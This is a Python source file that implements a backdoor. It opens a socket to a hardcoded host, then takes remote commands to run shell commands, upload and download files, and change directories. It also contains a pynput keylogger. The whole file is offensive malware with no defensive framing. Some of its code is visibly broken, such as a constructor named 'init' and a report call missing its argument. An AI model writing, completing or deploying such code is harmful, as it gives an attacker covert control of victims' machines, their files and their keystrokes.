import subprocess
import socket
import json
import base64
import os
import pynput
import threading


class Backdoor:
    def init(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.log = ''

    def onpress_key(self, key):
        # global log
        try:
            self.log = self.log + str(key.char)
        except AttributeError:
            if key == key.space:
                self.log = self.log + " "
            elif key == key.enter:
                self.log = self.log + "\r\n________\r\n"
            else:
                self.log = self.log + " " + str(key) + " "

    def report(self, path):
        # global log
        # print(self.log)
        with open(path, 'w') as key:
            return key.write(self.log)
        # self.log = ""
        # timer = threading.Timer(100, self.report)
        # timer.start()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.onpress_key)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def system_cmd(self, commands):
        return subprocess.check_output(commands, shell=True)

    def b_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def b_recieve(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def read_file(self, path):
        with open(path, 'rb') as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Upload sucessfull.....'

    def change_dir(self, path):
        os.chdir(path)
        return '[+] changing dir to ' + path

    def run(self):
        while True:
            command = self.b_recieve()
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    exit()
                elif command[0] == 'cd' and len(command) > 1:
                    result = self.change_dir(command[1])
                elif command[0] == 'download':
                    result = self.read_file(command[1]).decode()
                elif command[0] == 'upload':
                    result = self.write_file(command[1], command[2])
                elif command[0] == 'keyboard':
                    self.start()
                else:
                    result = self.system_cmd(command).decode()
            except Exception:
                result = '[-] Syntax Error'
            self.b_send(result)

        self.connection.close()


backdoor = Backdoor("192.168.0.103", 80)
backdoor.run()